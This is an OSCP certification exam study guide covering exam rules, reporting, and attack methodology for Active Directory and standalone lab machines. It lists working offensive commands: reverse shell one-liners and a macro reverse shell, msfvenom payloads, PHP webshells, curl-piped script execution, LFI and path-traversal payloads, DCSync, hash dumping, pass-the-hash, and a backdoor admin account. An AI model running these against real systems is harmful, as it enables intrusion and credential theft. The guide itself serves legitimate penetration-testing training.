# OSCP Exam Guide

## Table of Contents

- [Exam Structure](#exam-structure)
- [Passing Scenarios](#passing-scenarios)
- [Allowed Tools](#allowed-tools)
- [Restricted Tools](#restricted-tools)
- [Pre-Exam Checklist](#pre-exam-checklist)
- [Exam Connection](#exam-connection)
- [Screenshot Requirements](#screenshot-requirements)
- [Report Submission](#report-submission)
- [Report Templates](#report-templates)
- [Exam Tips](#exam-tips)
- [AD Set Step-by-Step Methodology](#ad-set-step-by-step-methodology)
  - [Phase 0: Pre-Attack Setup](#phase-0-pre-attack-setup)
  - [Phase 1: Initial Foothold](#phase-1-initial-foothold-machine-1---wsclient)
  - [Phase 2: Privilege Escalation](#phase-2-privilege-escalation-machine-1)
  - [Phase 3: Setup Pivoting](#phase-3-setup-pivoting)
  - [Phase 4: Lateral Movement](#phase-4-lateral-movement-machine-2---srv)
  - [Phase 5: Domain Controller](#phase-5-domain-controller-machine-3---dc)
  - [Phase 6: Post-Exploitation](#phase-6-post-exploitation)
- [AD Attack Flowchart](#ad-attack-flowchart)
- [Common AD Attack Chains](#common-ad-attack-chains)
- [Quick Reference Commands](#quick-reference-commands)
- [Quick Reference Card](#quick-reference-card)
- [Standalone Machine Step-by-Step Methodology](#standalone-machine-step-by-step-methodology)
  - [Standalone Phase 0: Pre-Attack Setup](#standalone-phase-0-pre-attack-setup)
  - [Phase 1: Enumeration](#phase-1-enumeration-15-นาที)
  - [Phase 2: Initial Access](#phase-2-initial-access-20-นาที)
  - [Phase 3: Privilege Escalation - Linux](#phase-3-privilege-escalation---linux-15-นาที)
  - [Phase 3: Privilege Escalation - Windows](#phase-3-privilege-escalation---windows-15-นาที)
  - [Phase 4: Post-Exploitation](#phase-4-post-exploitation)
- [Standalone Machine Attack Flowchart](#standalone-machine-attack-flowchart)
- [Common Standalone Attack Chains](#common-standalone-attack-chains)
- [Standalone Quick Reference by Service](#standalone-quick-reference-by-service)
- [References](#references)

---

## Exam Structure

> OSCP+ exam is 24 hours with additional 24 hours for report writing

### Point Distribution

| Component | Points | Details |
| :--- | :---: | :--- |
| Active Directory Set | 40 | 3 machines (10 + 10 + 20 pts) |
| Standalone Machine 1 | 20 | 10 initial + 10 privesc |
| Standalone Machine 2 | 20 | 10 initial + 10 privesc |
| Standalone Machine 3 | 20 | 10 initial + 10 privesc |
| **Total** | **100** | Need **70 points** to pass |

### AD Set Details

- Provided with username and password (Assumed Breach scenario)
- Must compromise entire domain for points
- 3 machines connected via Active Directory:
  - Machine #1: 10 points
  - Machine #2: 10 points  
  - Machine #3 (typically DC): 20 points

---

## Passing Scenarios

> Minimum 70 points required to pass

| Scenario | AD Points | Standalone | Total |
| :--- | :---: | :--- | :---: |
| Full AD + 3 local.txt | 40 | 30 (3×10) | **70** ✓ |
| Full AD + 2 local.txt + 1 proof.txt | 40 | 30 (20+10+10) | **70** ✓ |
| Partial AD (20) + 3 local.txt + 2 proof.txt | 20 | 50 (30+20) | **70** ✓ |
| No AD + 3 full machines | 0 | 60 | 60 ✗ |
| Full AD + 2 local.txt | 40 | 20 | 60 ✗ |

> **Note:** Partial AD means compromising machines but NOT the full domain

---

## Allowed Tools

> All tools that do not perform restricted actions are allowed

### Specifically Allowed

- BloodHound (Legacy and Community Edition only)
- SharpHound
- PowerShell Empire
- Covenant
- PowerView
- Rubeus
- evil-winrm
- Responder (Poisoning/Spoofing NOT allowed)
- CrackMapExec / NetExec
- Mimikatz
- Impacket
- PrintSpoofer
- GodPotato / SweetPotato / JuicyPotato
- Chisel / Ligolo-ng
- Metasploit (with restrictions - see below)

### Metasploit Restrictions

> **Can ONLY use ONE Metasploit exploit module on ONE machine**

- `exploit/multi/handler` - UNLIMITED use on all machines ✓
- `msfvenom` for payload generation - UNLIMITED use ✓
- Only ONE Metasploit exploit module allowed for the entire exam

---

## Restricted Tools

> **DO NOT USE - Automatic fail**

| Category | Examples |
| :--- | :--- |
| Spoofing | IP spoofing, ARP spoofing, DNS spoofing, NBNS spoofing |
| Commercial Tools | Metasploit Pro, Burp Suite Pro, Cobalt Strike |
| Auto-Exploitation | db_autopwn, browser_autopwn, SQLmap, SQLninja |
| Mass Vuln Scanners | Nessus, Nexpose, OpenVAS, Canvas, Core Impact, SAINT |
| AI Chatbots | ChatGPT, OffSec KAI, YouChat, Claude, Copilot |

> **Warning:** Features in other tools that utilize forbidden functions are also prohibited

---

## Pre-Exam Checklist

### Technical Requirements

- [ ] Kali Linux VM (x86-64, latest VMware image)
- [ ] Webcam working
- [ ] Google Chrome/Firefox/Brave/Edge with Janus plugin
- [ ] Screen sharing configured (use Xorg/X11, NOT Wayland)
- [ ] Stable internet connection
- [ ] OSID and MD5 hash received

### Software Preparation

- [ ] OpenVPN installed and tested
- [ ] Tools downloaded and tested:
  - [ ] Chisel / Ligolo-ng binaries
  - [ ] Mimikatz / Rubeus
  - [ ] Impacket tools
  - [ ] PowerView / SharpHound
  - [ ] LinPEAS / WinPEAS
  - [ ] Webshells ready

### Documentation Setup

- [ ] Note-taking tool ready (Obsidian, CherryTree, etc.)
- [ ] Screenshot tool configured
- [ ] Report template downloaded

---

## Exam Connection

### Download VPN Pack

VPN connection pack is sent at exam start time (not in advance)

```shell
# Extract
tar xvfj exam-connection.tar.bz2

# Connect
sudo openvpn OS-XXXXXX-OSCP.ovpn
```

### Troubleshooting

```shell
# If connection issues, download fresh VPN pack
# Check for conflicting network interfaces
ip addr

# Kill existing VPN
sudo killall openvpn
```

---

## Screenshot Requirements

> **CRITICAL:** Without proper screenshots, points will NOT be awarded

### Required Elements

1. Contents of `local.txt` or `proof.txt`
2. IP address shown via `ifconfig`, `ipconfig`, or `ip addr`
3. Both in the SAME screenshot

### Examples

#### Linux

```shell
cat local.txt && ip addr
cat proof.txt && hostname && ip addr
```

#### Windows

```cmd
type local.txt && ipconfig
type proof.txt && hostname && ipconfig
```

### Flag Submission

- Submit flags in control panel BEFORE exam ends
- Flags change on revert - submit immediately
- Control panel does NOT indicate if correct

---

## Report Submission

### File Naming

```text
OSCP-OS-XXXXX-Exam-Report.pdf
OSCP-OS-XXXXX-Exam-Report.7z
```

> Replace `OS-XXXXX` with your OSID

### Archive Creation

```shell
# Create 7z archive (NO PASSWORD)
7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf

# Verify MD5
md5sum OSCP-OS-XXXXX-Exam-Report.7z
```

### Submission Checklist

- [ ] Report in PDF format
- [ ] Correct filename format
- [ ] Archived as .7z (NO password)
- [ ] Under 200MB
- [ ] Upload to <https://upload.offsec.com>

---

## Report Templates

### Official Templates

- **Word:** <https://www.offensive-security.com/pwk-online/OSCP-Exam-Report.docx>
- **LibreOffice:** <https://www.offensive-security.com/pwk-online/OSCP-Exam-Report.odt>

### Report Structure

1. **Cover Page** - OSID, Date
2. **Executive Summary** - High-level findings
3. **Methodology** - Tools and approach used
4. **Findings** - Each machine with:
   - Target IP
   - Service enumeration
   - Vulnerability identified
   - Exploitation steps
   - Proof screenshots
   - Privilege escalation
   - Proof.txt screenshot
5. **Appendix** - Additional tools, code used

### Exploit Code Rules

- **Unmodified exploits:** URL only, no code
- **Modified exploits:** Include:
  - Modified code with highlighted changes
  - Original exploit URL
  - Shellcode generation commands
  - Explanation of changes

---

## Exam Tips

### Time Management

| Phase | Time | Focus |
| :--- | :---: | :--- |
| Initial Enum | 1-2 hrs | Scan all targets, identify services |
| AD Set | 4-6 hrs | Complete AD chain first |
| Standalone 1 | 2-3 hrs | Easier machine |
| Standalone 2 | 2-3 hrs | Medium difficulty |
| Standalone 3 | 2-3 hrs | Harder machine |
| Buffer | 4-6 hrs | Stuck machines, re-enum |
| Report | 24 hrs | Day 2 |

### Enumeration Priority

```text
1. Run full nmap scan on all targets
2. Start gobuster/feroxbuster on web services
3. Check AD user credentials work
4. Enumerate AD while web scans run
5. Check for easy wins (known CVEs, default creds)
```

### When Stuck

1. **Re-enumerate** - You missed something
2. **Check other ports** - UDP? High ports?
3. **Read exploit code** - Understand what it does
4. **Google error messages** - Add "HTB" or "OSCP"
5. **Take a break** - Walk, eat, rest
6. **Try another machine** - Fresh perspective

### Common Mistakes

- [ ] Not submitting flags before revert
- [ ] Poor screenshots (missing IP)
- [ ] Forgetting to document steps
- [ ] Using Metasploit on multiple machines
- [ ] Not reading exploit requirements

---

## AD Set Step-by-Step Methodology

> Assumed Breach: You start with valid credentials for a domain user

### Phase 0: Pre-Attack Setup

```shell
# Setup file server for transfers
python -m http.server 80

# Prepare listeners
rlwrap nc -lvnp 443
rlwrap nc -lvnp 4444

# Prepare Ligolo-ng for pivoting
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

#### Essential Tools to Transfer

| Tool | Purpose |
| :--- | :--- |
| SharpHound.ps1 / SharpHound.exe | BloodHound collection |
| winPEAS.exe | Windows privilege enumeration |
| PrivescCheck.ps1 | Alternative privesc checker |
| Rubeus.exe | Kerberos attacks |
| mimikatz.exe | Credential extraction |
| nc64.exe | Reverse shell / file transfer |
| Ligolo agent.exe | Pivoting |
| Chisel | Port forwarding |
| SigmaPotato.exe | SeImpersonatePrivilege abuse |
| LaZagne.exe | Credential recovery |
| PowerView.ps1 | AD enumeration |

---

### Phase 1: Initial Foothold (Machine #1 - WS/Client)

#### Step 1.1: Validate Credentials

```shell
# Check WinRM access
netexec winrm $target -u 'user' -p 'password' --continue-on-success

# Check RDP access
netexec rdp $target -u 'user' -p 'password' --continue-on-success

# Check SMB access
netexec smb $target -u 'user' -p 'password' --continue-on-success
```

#### Step 1.2: Connect to Target

```shell
# Option 1: Evil-WinRM (preferred)
evil-winrm -i $target -u 'user' -p 'password'

# Option 2: RDP with drive share
xfreerdp /cert-ignore /u:'user' /p:'password' /v:$target /drive:/var/www/html
```

#### Step 1.3: Transfer Tools & Enumerate

```powershell
# Download tools
certutil -urlcache -f http://$lhost/winpeas64.exe winpeas64.exe
certutil -urlcache -f http://$lhost/SharpHound.ps1 SharpHound.ps1
certutil -urlcache -f http://$lhost/PrivescCheck.ps1 PrivescCheck.ps1

# Run WinPEAS
.\winpeas64.exe

# Run PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

#### Step 1.4: BloodHound Collection

```powershell
powershell -ep bypass
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public -OutputPrefix "AD"

# Download zip file for analysis
download C:\Users\Public\AD_*.zip
```

#### Step 1.5: Analyze BloodHound

Look for:

- **Shortest path to Domain Admins**
- **Users with DCSync rights**
- **Kerberoastable users**
- **ASREPRoastable users**
- **ACL abuse paths** (AllExtendedRights, GenericAll, WriteDacl)
- **GPO abuse paths**

---

### Phase 2: Privilege Escalation (Machine #1)

#### Check Privileges

```powershell
whoami /priv
whoami /groups
```

#### Common Escalation Paths

| Finding | Attack |
| :--- | :--- |
| SeImpersonatePrivilege | SigmaPotato / GodPotato |
| SeBackupPrivilege | Dump SAM/SYSTEM |
| AutoLogon credentials in registry | WinPEAS finds these |
| Saved credentials | `cmdkey /list` + RunAs |
| Unquoted service path | Service hijacking |
| DLL Hijacking | Replace vulnerable DLL |
| AllExtendedRights on user | Reset password |
| Stored credentials | LaZagne |

#### SigmaPotato (SeImpersonatePrivilege)

```powershell
.\SigmaPotato.exe "net user backdoor Password123! /add"
.\SigmaPotato.exe "net localgroup Administrators backdoor /add"
```

#### LaZagne (Credential Recovery)

```cmd
.\laZagne.exe all -quiet
```

#### AllExtendedRights Abuse

```shell
# From Kali - Reset target user password
net rpc password "target_user" 'NewPass123!' -U "domain/current_user%password" -S $dc_ip

# Verify new creds
netexec winrm $target -u 'target_user' -p 'NewPass123!' -d domain
```

---

### Phase 3: Setup Pivoting

> Required to reach internal machines (Machine #2, DC)

#### Ligolo-ng Setup

```shell
# On Kali (start proxy)
./proxy -selfcert

# Add route for internal network
sudo ip route add 172.16.x.0/24 dev ligolo
```

```powershell
# On Target (run agent)
certutil -urlcache -f http://$lhost/agent.exe agent.exe
.\agent.exe -connect $lhost:11601 -ignore-cert
```

```shell
# In Ligolo console
session     # Select session
ifconfig    # View internal IPs
start       # Start tunnel
```

#### Port Forwarding with Ligolo

```shell
# Forward local port to internal service
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
```

---

### Phase 4: Lateral Movement (Machine #2 - SRV)

#### Step 4.1: Enumerate Internal Network

```shell
# Scan internal hosts through tunnel
nmap -T4 -p- -Pn 172.16.x.202

# Check access with current creds
netexec smb 172.16.x.0/24 -u 'user' -p 'password' --continue-on-success
netexec winrm 172.16.x.0/24 -u 'user' -p 'password' --continue-on-success
```

#### Step 4.2: Find More Credentials

Check on compromised machine:

- **PowerShell history**: `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- **Registry AutoLogon**: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
- **Saved RDP connections**: `HKCU\Software\Microsoft\Terminal Server Client\Servers`
- **MSSQL credentials**: If running SQL Server, connect and check creds table

#### Step 4.3: MSSQL Exploitation (Common)

```shell
# If port 1433 found
# Forward port through Chisel/Ligolo
impacket-mssqlclient 'user'@127.0.0.1 -windows-auth

# Enumerate
SQL> SELECT name FROM sys.databases;
SQL> use accounts;
SQL> SELECT * FROM creds;

# Enable xp_cmdshell for RCE
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

#### Step 4.4: Credential Spraying

```shell
# Combine found users and passwords
netexec winrm 172.16.x.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

---

### Phase 5: Domain Controller (Machine #3 - DC)

#### Step 5.1: Check DC Access

```shell
netexec smb $dc_ip -u 'user' -p 'password' -d domain
netexec winrm $dc_ip -u 'user' -p 'password' -d domain
```

#### Step 5.2: SeBackupPrivilege Abuse (If Present)

```powershell
# Check privileges
whoami /priv

# If SeBackupPrivilege enabled
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
download SAM
download SYSTEM

# Extract hashes on Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

#### Step 5.3: DCSync (If Rights Exist)

```shell
# Full DCSync
impacket-secretsdump domain/user:password@$dc_ip

# Extract specific user
impacket-secretsdump -just-dc-user Administrator domain/user:password@$dc_ip
```

#### Step 5.4: Pass the Hash

```shell
# With extracted NTLM hash
evil-winrm -i $dc_ip -u 'Administrator' -H 'HASH'
impacket-psexec domain/Administrator@$dc_ip -hashes :HASH
```

---

### Phase 6: Post-Exploitation

#### Capture Proof

```powershell
# Always capture both in same screenshot!
type C:\Users\Administrator\Desktop\proof.txt
hostname
ipconfig
```

#### Extract All Secrets (Optional)

```shell
# Full domain dump
impacket-secretsdump domain/Administrator@$dc_ip -just-dc
```

---

## AD Attack Flowchart

```text
┌─────────────────────────────────────────────────────────────────┐
│                    OSCP AD SET METHODOLOGY                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐    Validate     ┌──────────────┐              │
│  │  Start with  │───────────────▶│   Machine #1  │              │
│  │  Credentials │   WinRM/RDP     │   (WS/Client) │              │
│  └──────────────┘                 └───────┬──────┘              │
│                                           │                      │
│                         BloodHound + WinPEAS + PrivescCheck      │
│                                           ▼                      │
│  ┌────────────────────────────────────────────────────────┐     │
│  │  Look For:                                              │     │
│  │  • SeImpersonatePrivilege → SigmaPotato                │     │
│  │  • SeBackupPrivilege → SAM/SYSTEM dump                 │     │
│  │  • Registry AutoLogon → New creds                      │     │
│  │  • AllExtendedRights → Password reset                  │     │
│  │  • Saved creds → LaZagne                               │     │
│  │  • PowerShell history → Leaked passwords               │     │
│  └────────────────────────────────────────────────────────┘     │
│                                           │                      │
│                                   PrivEsc + Pivot                │
│                                    (Ligolo-ng)                   │
│                                           ▼                      │
│  ┌──────────────┐   Spray creds   ┌──────────────┐              │
│  │  Machine #2  │◀────────────────│   Internal   │              │
│  │  (SRV/Member)│   or new creds  │   Network    │              │
│  └───────┬──────┘                 └──────────────┘              │
│          │                                                       │
│  • Check MSSQL → Query for creds                                │
│  • Check shares → Sensitive files                               │
│  • Check history → PowerShell history                           │
│          │                                                       │
│          ▼                                                       │
│  ┌──────────────┐                                               │
│  │  Machine #3  │  ← SeBackupPrivilege + SAM dump               │
│  │  (DC)        │  ← DCSync if have rights                      │
│  └───────┬──────┘  ← Pass-the-Hash with Admin NTLM              │
│          │                                                       │
│          ▼                                                       │
│  ┌──────────────┐                                               │
│  │   DOMAIN     │  proof.txt + hostname + ipconfig              │
│  │   ADMIN!     │                                               │
│  └──────────────┘                                               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Common AD Attack Chains

### Chain 1: ACL Abuse

```text
User A (provided creds)
    │
    ├─► BloodHound finds AllExtendedRights on User B
    │
    ├─► Reset User B password
    │
    ├─► User B has GenericAll on User C (Admin)
    │
    └─► Reset User C password → Admin access
```

### Chain 2: Credential Hopping

```text
User A (provided creds)
    │
    ├─► WinPEAS finds AutoLogon creds → User B
    │
    ├─► User B accesses Machine #2
    │
    ├─► MSSQL on Machine #2 contains creds → User C
    │
    ├─► User C has SeBackupPrivilege on DC
    │
    └─► Dump SAM → Admin hash → PTH to DC
```

### Chain 3: Service Abuse

```text
User A (provided creds)
    │
    ├─► SeImpersonatePrivilege → SigmaPotato → Local Admin
    │
    ├─► Extract cached creds with mimikatz → User B
    │
    ├─► User B member of "SQL Admins" → MSSQL access
    │
    ├─► xp_cmdshell on Machine #2 → Shell
    │
    └─► Machine #2 has DCSync rights → Domain Admin
```

### Chain 4: GPO Abuse

```text
User A (provided creds)
    │
    ├─► BloodHound finds GPO write access
    │
    ├─► SharpGPOAbuse → Add User A to local Admins
    │
    ├─► gpupdate /force
    │
    └─► Admin on all machines affected by GPO
```

---

## Quick Reference Commands

### Credential Validation

```shell
netexec smb $target -u 'user' -p 'pass'          # SMB check
netexec winrm $target -u 'user' -p 'pass'        # WinRM check
netexec rdp $target -u 'user' -p 'pass'          # RDP check
netexec smb $target -u 'user' -H 'HASH'          # Pass-the-hash
```

### Shell Access

```shell
evil-winrm -i $target -u 'user' -p 'pass'        # WinRM shell
evil-winrm -i $target -u 'user' -H 'HASH'        # PTH shell
impacket-psexec domain/user:pass@$target         # PsExec shell
impacket-wmiexec domain/user:pass@$target        # WMI shell
```

### Credential Extraction

```shell
impacket-secretsdump domain/user:pass@$target                # Remote dump
impacket-secretsdump -sam SAM -system SYSTEM LOCAL           # Local dump
impacket-secretsdump -ntds ntds.dit -system system LOCAL     # NTDS dump
```

### Kerberos Attacks

```shell
impacket-GetUserSPNs domain/user:pass -dc-ip $target -request    # Kerberoast
impacket-GetNPUsers domain/ -usersfile users.txt -format hashcat   # AS-REP
```

### Password Cracking

```shell
hashcat -m 13100 hashes /path/to/wordlist    # Kerberoast
hashcat -m 18200 hashes /path/to/wordlist    # AS-REP
hashcat -m 1000 hashes /path/to/wordlist     # NTLM
hashcat -m 5600 hashes /path/to/wordlist     # NetNTLMv2
```

- [ ] Overcomplicating (OSCP is about basics)

---

## Quick Reference Card

### Essential Commands

```shell
# Full TCP scan
sudo nmap -sS -p- --min-rate 1000 $target -oN full.txt

# Version/Script scan
sudo nmap -sC -sV -p 22,80,445 $target -oN detail.txt

# Web directory
feroxbuster -u http://$target -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# SMB null session
smbclient -L //$target -N
crackmapexec smb $target -u '' -p '' --shares

# Password spray
crackmapexec smb $target -u users.txt -p 'Password123' --continue-on-success

# Transfer files (Windows)
certutil -urlcache -split -f http://$lhost/file.exe file.exe
powershell (New-Object Net.WebClient).DownloadFile('http://$lhost/file.exe','file.exe')

# Transfer files (Linux)
wget http://$lhost/file.sh
curl http://$lhost/file.sh -o file.sh
```

### Reverse Shells

```shell
# Bash
bash -i >& /dev/tcp/$lhost/$lport 0>&1

# PowerShell (base64 from revshells.com)
powershell -e <BASE64>

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### Shell Upgrade

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo;fg
reset
```

---

## Standalone Machine Step-by-Step Methodology

> เครื่อง Standalone มี 3 เครื่อง (60 คะแนน) - เป้าหมาย: Initial Foothold + Privilege Escalation

### Standalone Phase 0: Pre-Attack Setup

#### เตรียม Tools และ Listeners

```shell
# Start HTTP Server สำหรับ transfer files
python3 -m http.server 80 -d /opt/www/

# Start Netcat listener หลายพอร์ต
rlwrap nc -nlvp 443
rlwrap nc -nlvp 4444
rlwrap nc -nlvp 9001

# Start SMB server (สำหรับ Windows)
impacket-smbserver share /opt/www -smb2support

# Prepare wordlists
cp /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt ./users.txt
cp /usr/share/wordlists/rockyou.txt ./
```

#### เตรียม Payloads

```shell
# Windows Reverse Shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o rev.exe

# Linux Reverse Shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f elf -o rev.elf

# PHP Webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' > cmd.php

# WAR file for Tomcat/GlassFish
msfvenom -p java/shell_reverse_tcp LHOST=$lhost LPORT=443 -f war -o rev.war

# ASP/ASPX Webshell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f aspx -o shell.aspx
```

---

### Phase 1: Enumeration (15 นาที)

#### Port Scanning

```shell
# Quick scan (1000 ports)
nmap -sC -sV -oN nmap_initial.txt $target

# Full port scan (ทำ background)
nmap -p- --min-rate=5000 -oN nmap_full.txt $target

# UDP scan (top 20)
sudo nmap -sU --top-ports=20 -oN nmap_udp.txt $target
```

#### Service Identification Matrix

| Port | Service | First Action |
| :--- | :--- | :--- |
| 21 | FTP | `ftp $target` → anonymous login? |
| 22 | SSH | ไว้ใช้ brute-force ทีหลัง |
| 80/443 | HTTP | `gobuster` + `nikto` |
| 139/445 | SMB | `smbclient -L //$target -N` |
| 1433 | MSSQL | `impacket-mssqlclient` |
| 3306 | MySQL | `mysql -h $target -u root` |
| 3389 | RDP | ไว้ใช้ credential spray |
| 8080 | HTTP | Web app enumeration |

#### Web Enumeration

```shell
# Directory brute-force
gobuster dir -u http://$target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,asp,aspx -o gobuster.txt

# Subdomain enumeration (if domain)
gobuster vhost -u http://$domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Nikto scan
nikto -h http://$target -o nikto.txt

# WPScan (if WordPress)
wpscan --url http://$target -e ap,at,u --api-token $WPSCAN_API
```

#### FTP/SMB Enumeration

```shell
# FTP anonymous login
ftp $target
# user: anonymous, pass: anonymous

# SMB shares
smbclient -L //$target -N
smbclient //$target/share -N
netexec smb $target -u '' -p '' --shares

# Download all files from SMB
smbclient //$target/share -N -c 'prompt OFF; recurse ON; mget *'
```

---

### Phase 2: Initial Access (20 นาที)

#### Common Attack Vectors by Service

##### Web Applications

```shell
# 1. Default Credentials (ลองก่อนเสมอ!)
# admin:admin, admin:password, root:root, guest:guest

# 2. WordPress - Mail Masta LFI (CVE-2016-10956)
curl "http://$target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

# 3. WordPress - wp-config.php via php://filter
curl "http://$target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../wp-config.php"

# 4. File Manager webshell upload
# eXtplorer, Elfinder, WP File Manager → upload PHP shell

# 5. GlassFish Path Traversal (CVE-2017-1000028)
curl "http://$target:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile"
```

##### Service Exploitation

```shell
# FTP - Download files, look for credentials/keys
get id_rsa
get .keychain
get backup.zip

# Crack downloaded files
keychain2john file.keychain > keychain.hash
zip2john backup.zip > zip.hash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# MSSQL - Enable xp_cmdshell
impacket-mssqlclient user:password@$target -windows-auth
> enable_xp_cmdshell
> xp_cmdshell whoami
```

##### Credential Spray (เมื่อมี username/password)

```shell
# SSH
hydra -L users.txt -p 'FoundPassword' ssh://$target

# RDP
netexec rdp $target -u users.txt -p 'FoundPassword'

# SMB
netexec smb $target -u users.txt -p 'FoundPassword'

# FTP
hydra -L users.txt -p 'FoundPassword' ftp://$target
```

##### LibreOffice/OpenOffice Macro (ODT/ODS)

```python
# Python reverse shell macro for LibreOffice
# Insert as macro in Tools → Macros → Organize Macros

import subprocess
subprocess.Popen(["/bin/bash", "-c", "bash -i >& /dev/tcp/$lhost/443 0>&1"])
```

---

### Phase 3: Privilege Escalation - Linux (15 นาที)

#### Automated Enumeration

```shell
# LinPEAS
curl http://$lhost/linpeas.sh | bash

# LinEnum
./linenum.sh

# Manual quick checks
id
sudo -l
cat /etc/passwd | grep -v nologin
find / -perm -4000 2>/dev/null
```

#### Common Privilege Escalation Paths

| Check | Command | Escalation |
| :--- | :--- | :--- |
| sudo -l | `sudo -l` | GTFOBins |
| SUID binaries | `find / -perm -4000 2>/dev/null` | GTFOBins / Custom exploit |
| Group: disk | `id` | `debugfs /dev/sda1` |
| Group: docker | `id` | `docker run -v /:/mnt --rm -it alpine chroot /mnt bash` |
| Cron jobs | `cat /etc/crontab` | Writable script / Path hijack |
| Writable /etc/passwd | `ls -la /etc/passwd` | Add root user |

#### SUID Exploits

```shell
# strace SUID
strace -o /dev/null /bin/sh -p

# mawk (sudo)
sudo mawk 'BEGIN {system("/bin/bash")}'

# find
find . -exec /bin/bash -p \;

# vim
vim -c ':!/bin/bash'
```

#### Disk Group Abuse

```shell
# List partitions
df -h
lsblk

# Access disk as root
debugfs /dev/sda1
> cat /etc/shadow
> cat /root/.ssh/id_rsa
```

---

### Phase 3: Privilege Escalation - Windows (15 นาที)

#### Windows Automated Enumeration

```powershell
# WinPEAS
.\winpeas.exe

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Manual quick checks
whoami /priv
whoami /groups
net user
net localgroup administrators
```

#### Windows Common Privilege Escalation Paths

| Check | Command | Escalation |
| :--- | :--- | :--- |
| SeImpersonatePrivilege | `whoami /priv` | SigmaPotato / PrintSpoofer |
| SeBackupPrivilege | `whoami /priv` | SAM/SYSTEM dump → secretsdump |
| Scheduled Tasks | `schtasks /query /fo LIST /v` | Task hijack |
| Unquoted Service | `wmic service get name,pathname` | Binary replace |
| DLL Hijacking | Process Monitor analysis | Malicious DLL |
| AlwaysInstallElevated | `reg query HKLM\...\Installer` | MSI payload |

#### SeImpersonatePrivilege

```powershell
# SigmaPotato
.\SigmaPotato.exe "cmd.exe /c whoami > C:\temp\out.txt"
.\SigmaPotato.exe "cmd.exe /c net localgroup administrators user /add"

# PrintSpoofer
.\PrintSpoofer64.exe -i -c cmd
```

#### SeBackupPrivilege

```powershell
# Dump SAM and SYSTEM
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system

# On Kali - extract hashes
impacket-secretsdump -sam sam -system system LOCAL
```

#### DLL Hijacking

```shell
# Generate malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f dll -o malicious.dll

# Place DLL in application directory (e.g., Wondershare, etc.)
# Restart service or wait for scheduled task
```

---

### Phase 4: Post-Exploitation

#### Post-Exploitation Capture Proof

```shell
# Linux
cat /root/proof.txt
cat /home/*/local.txt
hostname
ip addr

# Windows
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\*\Desktop\local.txt
hostname
ipconfig
```

#### Post-Exploitation Screenshot Requirements

```text
✅ proof.txt content
✅ hostname
✅ IP address (ip addr / ipconfig)
✅ whoami (verify root/SYSTEM)
```

---

## Standalone Machine Attack Flowchart

```text
┌─────────────────────────────────────────────────────────────────────────────┐
│                      STANDALONE MACHINE METHODOLOGY                         │
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────┐
│  START      │
│  nmap scan  │
└──────┬──────┘
       │
       ▼
┌──────────────────────────────────────────────────────────────┐
│              Identify Services                                │
├──────────────────────────────────────────────────────────────┤
│  FTP(21) │ SSH(22) │ HTTP(80) │ SMB(445) │ RDP(3389) │ Other │
└────┬─────┴────┬────┴────┬─────┴────┬─────┴────┬──────┴───────┘
     │          │         │          │          │
     ▼          │         ▼          ▼          │
┌──────────┐    │    ┌─────────┐ ┌─────────┐    │
│ Anonymous│    │    │ WebApp  │ │  Null   │    │
│  Login?  │    │    │  Enum   │ │ Session?│    │
└────┬─────┘    │    └────┬────┘ └────┬────┘    │
     │          │         │           │          │
     ▼          │         ▼           ▼          │
┌──────────┐    │    ┌─────────┐ ┌─────────┐    │
│ Download │    │    │ Default │ │ Download│    │
│  Files   │    │    │  Creds? │ │  Files  │    │
└────┬─────┘    │    └────┬────┘ └────┬────┘    │
     │          │         │           │          │
     ▼          │         ▼           ▼          │
┌──────────┐    │    ┌─────────┐ ┌─────────┐    │
│ Crack    │    │    │ LFI/RCE │ │  ntlm   │    │
│ Hashes   │    │    │ Exploit │ │  theft  │    │
│(keychain,│    │    │(webshell│ │(Respond)│    │
│ zip, etc)│    │    │,CVE,etc)│ │         │    │
